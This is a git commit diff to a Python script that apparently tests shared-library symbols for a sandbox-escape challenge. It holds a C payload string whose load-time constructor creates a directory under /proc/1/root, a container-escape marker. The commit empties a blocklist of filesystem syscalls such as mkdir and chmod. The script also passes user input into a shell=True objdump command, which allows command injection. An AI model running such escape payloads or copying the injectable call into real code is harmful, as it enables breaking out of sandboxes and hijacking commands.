e12233d12a5b3195355c361c36dad87858f4c4b5
Jaeyoung <jjy600901@snu.ac.kr>
2020-11-13 22:46:03 -0800

    Auto

--- symbol/test_parser.py
+++ symbol/test_parser.py
@@ -1,23 +1,13 @@
 import subprocess
 so = input()
 exploit = """
-#include <sys/stat.h>
-#include <sys/types.h>
 void __attribute__((constructor)) EEEEEEEEEEEEEEEE(){
-    mkdir("/proc/1/root/ESCAPE",0755);
+    mkdir("/proc/1/root/ESCAPE");
 }
 void XXXXX(){}
 """
 
-black = [
-    'select', 'pselect', 'mkdir', 'futimens','utimensat',
-    'mkfifoat','mkfifo', 'mknodat', 'mkdirat', 'mknod', 'umask',
-    'fchmodat', 'chmod', 'lchmod', 'fchmod', 'lstat', 
-    'stat', 'fstat', 'fstatat',
-    'nftw'
-]
-
-
+black = []
 result = subprocess.check_output(f"objdump -T {so}", shell=True).decode()[:-1]
 result = result.split("\n")
 symbol = set()
